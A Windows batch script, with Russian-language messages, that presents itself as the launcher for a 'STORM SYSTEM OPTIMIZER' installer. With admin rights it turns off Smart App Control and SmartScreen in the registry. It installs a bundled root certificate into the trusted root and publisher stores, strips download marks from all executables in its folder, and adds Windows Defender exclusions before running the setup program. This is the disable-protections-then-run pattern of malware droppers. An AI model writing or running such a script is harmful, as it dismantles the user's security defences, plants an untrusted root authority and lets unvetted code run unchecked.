@echo off
chcp 65001 >nul
title STORM SYSTEM OPTIMIZER - Разблокировка Smart App Control и доверие сертификату

:: ============================================================
:: 1. Проверка и автоматический запрос прав Администратора
:: ============================================================
net session >nul 2>&1
if %errorLevel% neq 0 (
    echo [i] Запрос прав Администратора для снятия блокировок Smart App Control...
    powershell.exe -NoProfile -Command "Start-Process '%~f0' -Verb RunAs"
    exit /b
)

echo ============================================================
echo   STORM SYSTEM OPTIMIZER v1.0.9 - СНЯТИЕ ВСЕХ БЛОКИРОВОК
echo   (Smart App Control, SmartScreen, Mark-of-the-Web, Defender)
echo ============================================================
echo.

set "SCRIPT_DIR=%~dp0"
set "CERT_FILE=%SCRIPT_DIR%Files\STORM_Certificate.cer"

if not exist "%CERT_FILE%" (
    set "CERT_FILE=%SCRIPT_DIR%STORM_Certificate.cer"
)
if not exist "%CERT_FILE%" (
    set "CERT_FILE=%SCRIPT_DIR%Files\StormTeamRootCA.cer"
)
if not exist "%CERT_FILE%" (
    set "CERT_FILE=%SCRIPT_DIR%StormTeamRootCA.cer"
)

:: ============================================================
:: 2. Отключение блокировок Smart App Control и SmartScreen
:: ============================================================
echo [1/5] Снятие блокировок Интеллектуального управления приложениями (Smart App Control)...
reg add "HKLM\SYSTEM\CurrentControlSet\Control\CI\Policy" /v "VerifiedAndReputablePolicyState" /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKLM\SYSTEM\CurrentControlSet\Control\CI\Policy" /v "SAC_PreviousState" /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer" /v "SmartScreenEnabled" /t REG_SZ /d "Off" /f >nul 2>&1
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\AppHost" /v "EnableWebContentEvaluation" /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\System" /v "EnableSmartScreen" /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\SmartScreen" /v "ConfigureAppInstallControlEnabled" /t REG_DWORD /d 0 /f >nul 2>&1
echo [OK] Блокировки Smart App Control успешно деактивированы!

:: ============================================================
:: 3. Внедрение корневого сертификата STORM TEAM во все хранилища
:: ============================================================
echo.
if exist "%CERT_FILE%" (
    echo [2/5] Установка и подтверждение доверия сертификату STORM TEAM...
    certutil.exe -addstore -f "Root" "%CERT_FILE%" >nul 2>&1
    certutil.exe -addstore -f "TrustedPublisher" "%CERT_FILE%" >nul 2>&1
    certutil.exe -addstore -f "AuthRoot" "%CERT_FILE%" >nul 2>&1
    certutil.exe -addstore -f "CA" "%CERT_FILE%" >nul 2>&1
    certutil.exe -user -addstore -f "Root" "%CERT_FILE%" >nul 2>&1
    certutil.exe -user -addstore -f "TrustedPublisher" "%CERT_FILE%" >nul 2>&1
    powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "$c = New-Object System.Security.Cryptography.X509Certificates.X509Certificate2('%CERT_FILE%'); foreach ($loc in @([System.Security.Cryptography.X509Certificates.StoreLocation]::LocalMachine, [System.Security.Cryptography.X509Certificates.StoreLocation]::CurrentUser)) { foreach ($name in @([System.Security.Cryptography.X509Certificates.StoreName]::Root, [System.Security.Cryptography.X509Certificates.StoreName]::TrustedPublisher)) { try { $st = New-Object System.Security.Cryptography.X509Certificates.X509Store($name, $loc); $st.Open([System.Security.Cryptography.X509Certificates.OpenFlags]::ReadWrite); $st.Add($c); $st.Close(); } catch {} } }" >nul 2>&1
    echo [OK] Сертификат STORM TEAM успешно добавлен в Доверенные корневые центры и Издатели!
) else (
    echo [!] Файл сертификата не найден: %CERT_FILE%
)

:: ============================================================
:: 4. Снятие интернет-метки блокировки (Mark-of-the-Web)
:: ============================================================
echo.
echo [3/5] Снятие интернет-меток блокировки (Unblock Mark-of-the-Web)...
powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "Get-ChildItem -Path '%SCRIPT_DIR%' -Recurse -Include *.exe,*.dll,*.cer,*.bat,*.cmd,*.ps1 -ErrorAction SilentlyContinue | ForEach-Object { Unblock-File -Path $_.FullName -ErrorAction SilentlyContinue }" >nul 2>&1
echo [OK] Все файлы в директории успешно разблокированы!

:: ============================================================
:: 5. Добавление папки программы в исключения Windows Defender
:: ============================================================
echo.
echo [4/5] Добавление папки программы в исключения Защитника Windows...
powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "Add-MpPreference -ExclusionPath '%SCRIPT_DIR%' -ErrorAction SilentlyContinue; Add-MpPreference -ExclusionPath 'C:\Program Files\StormSystemOptimizer' -ErrorAction SilentlyContinue; Add-MpPreference -ExclusionProcess 'StormSystemOptimizer.exe' -ErrorAction SilentlyContinue; Add-MpPreference -ExclusionProcess 'STORM_SYSTEM_OPTIMIZER_1.0.9_Setup.exe' -ErrorAction SilentlyContinue" >nul 2>&1
echo [OK] Исключения в Защитник Windows успешно добавлены!

:: ============================================================
:: 6. Запуск программы / Установщика
:: ============================================================
echo.
echo [5/5] Запуск STORM SYSTEM OPTIMIZER v1.0.9...
echo.
echo ============================================================
echo   ГОТОВО! Все ограничения успешно сняты.
echo ============================================================
echo.

if exist "%SCRIPT_DIR%Files\STORM_SYSTEM_OPTIMIZER_1.0.9_Setup.exe" (
    start "" "%SCRIPT_DIR%Files\STORM_SYSTEM_OPTIMIZER_1.0.9_Setup.exe"
) else if exist "%SCRIPT_DIR%Assembling\StormSystemOptimizer.exe" (
    start "" "%SCRIPT_DIR%Assembling\StormSystemOptimizer.exe"
) else if exist "%SCRIPT_DIR%STORM_SYSTEM_OPTIMIZER_1.0.9_Setup.exe" (
    start "" "%SCRIPT_DIR%STORM_SYSTEM_OPTIMIZER_1.0.9_Setup.exe"
)

timeout /t 3 >nul
exit /b
